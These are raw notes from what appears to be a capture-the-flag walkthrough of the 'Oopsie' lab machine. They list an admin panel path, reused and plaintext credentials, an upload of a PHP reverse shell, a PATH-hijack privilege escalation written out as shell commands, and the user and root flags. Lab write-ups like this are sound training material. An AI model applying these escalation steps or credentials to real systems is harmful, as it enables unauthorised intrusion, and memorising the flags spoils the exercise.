#RAW NOTES

```
OOPSIE
port 80 22 open
```

```
admin panel in cdn-cgi/login
```

```
credentials of archetype
admin
MEGACORP_4DM1n
```

```
now id 30 is the super admin id
upload the file of php-reverse-shell and listener setup
```

```
we  get a shell of www-data
```

```
in var/www/html/login/cdn-cgi/db.php
we find credentials for robert
```

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

```
user flag
f2c74ee8db7983851ab2a96a44eb7981
```

```
we can escalate our privilage with
robert@oopsie:/usr/bin$ export PATH=/tmp:$PATH
robert@oopsie:/usr/bin$ cd /tmp/
robert@oopsie:/tmp$ echo '/bin/sh' > cat
robert@oopsie:/tmp$ chmod +x cat
```

```
becuz the bugtracker file was using relative path
```

```
post exploitation
root flag = af13b0bee69f8a877c3faf667f7beacf
```

```
ftp credentials was found inside /root/.config/ in xml file in plain text
```
